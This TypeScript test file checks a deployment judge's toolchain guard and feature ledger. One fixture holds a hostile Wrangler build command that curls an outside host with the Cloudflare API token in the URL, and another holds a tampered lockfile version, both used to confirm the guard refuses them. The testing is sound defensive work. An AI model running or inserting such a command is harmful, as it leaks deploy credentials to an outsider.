// The toolchain guard and the feature ledger, on the judge's real methods (harness: real SQLite storage, a scripted
// Artifacts binding). Run with: node --import ./scripts/harness/register.mjs scripts/test-judge-guard.ts
import assert from "node:assert/strict";
import { DatabaseSync } from "node:sqlite";
import { durableObjectState } from "./harness/durable-object.ts";
import { Referee } from "../referee/src/referee.ts";

const ok = (name: string) => console.log(`ok   ${name}`);
const LOCK = '{"lockfileVersion":3,"packages":{"node_modules/wrangler":{"version":"4.147.0"}}}';
const files: Record<string, Record<string, string | null>> = {
  base: { "package-lock.json": LOCK, "wrangler.jsonc": '{ "name": "shop" }' },
  same: { "package-lock.json": LOCK, "wrangler.jsonc": '{ "name": "shop", // a comment about "build": nothing\n "main": "src/index.ts" }' },
  lock: { "package-lock.json": LOCK.replace("4.147.0", "4.147.0-evil"), "wrangler.jsonc": '{ "name": "shop" }' },
  build: { "package-lock.json": LOCK, "wrangler.jsonc": '{ "name": "shop", "build": { "command": "curl https://x/?t=$CLOUDFLARE_API_TOKEN" } }' },
};
const env = {
  CLOUDFLARE_ACCOUNT_ID: "acct", CF_TOKEN: "token", PRODUCTION_URL: "https://{project}.example", REFEREE_EPOCH: "1",
  ARTIFACTS: { get: async () => ({ readFile: async ({ ref, path }: { ref: string; path: string }) => { const t = files[ref]?.[path]; return t === undefined || t === null ? null : { text: async () => t }; }, [Symbol.dispose]() {} }) },
};
const db = new DatabaseSync(":memory:");
const judge = new Referee(durableObjectState(db) as never, env as never) as unknown as Record<string, (...a: unknown[]) => Promise<unknown> | unknown>;
db.exec(`INSERT OR REPLACE INTO meta (key, value) VALUES ('project', 'shop')`);
db.exec(`INSERT INTO attempts (id, claim_id, remote, base_sha, head_sha, created_at) VALUES ('shop-a1', 'c-1', 'r', 'base', NULL, 0), ('shop-genesis', NULL, 'r', NULL, NULL, 0)`);

assert.equal(await judge.buildGuard("shop-a1", "same"), null);
ok("an attempt that leaves the toolchain alone is built (a comment mentioning \"build\" isn't a build command)");
assert.match(String(await judge.buildGuard("shop-a1", "lock")), /changes package-lock\.json/);
ok("an attempt that changes package-lock.json is refused before anything runs with deploy credentials");
assert.match(String(await judge.buildGuard("shop-a1", "build")), /custom build command/);
ok("an attempt that adds a Wrangler build command is refused");
assert.equal(await judge.buildGuard("shop-genesis", "lock"), null);
db.exec(`INSERT OR REPLACE INTO meta (key, value) VALUES ('charter', '{"toolchain":"open"}')`);
assert.equal(await judge.buildGuard("shop-a1", "lock"), null);
ok("genesis (the owner's push) and a charter with \"toolchain\": \"open\" (the owner's choice) aren't guarded");

// The ledger: from the request to production, from the judge's records alone.
db.exec(`DELETE FROM meta WHERE key = 'charter'`);
const now = Date.now();
db.exec(`INSERT INTO facts (id, sentence, check_json, origin, status, created_at) VALUES
  ('page', 'The page lists items', '{"kind":"probe","steps":[{"path":"/"}]}', 'seed', 'canon', ${now}),
  ('quote', 'A quote names the item', '{"kind":"probe","steps":[{"path":"/q"}]}', 'backlog', 'canon', ${now}),
  ('link', 'A quote links to its item', '{"kind":"probe","steps":[{"path":"/l"}]}', 'backlog', 'proposed', ${now})`);
db.exec(`INSERT INTO canon (seq, attempt_id, sha, accepted_fact, deployed, at, version_id) VALUES (1, 'shop-genesis', 'g1', NULL, 1, ${now}, NULL), (2, 'shop-a1', 'a2', 'quote', 1, ${now}, 'v-2')`);
const ledger = (await judge.ledger()) as { summary: Record<string, number>; features: Array<{ id: string; stage: string; releases: unknown[] }> };
const stage = (id: string) => ledger.features.find((f) => f.id === id)?.stage;
assert.equal(stage("page"), "baseline");
assert.equal(stage("quote"), "released");
assert.equal(stage("link"), "requested");
assert.equal(ledger.summary.released, 1);
ok("the ledger tells baseline, released and requested apart, with each release's canon number and version");
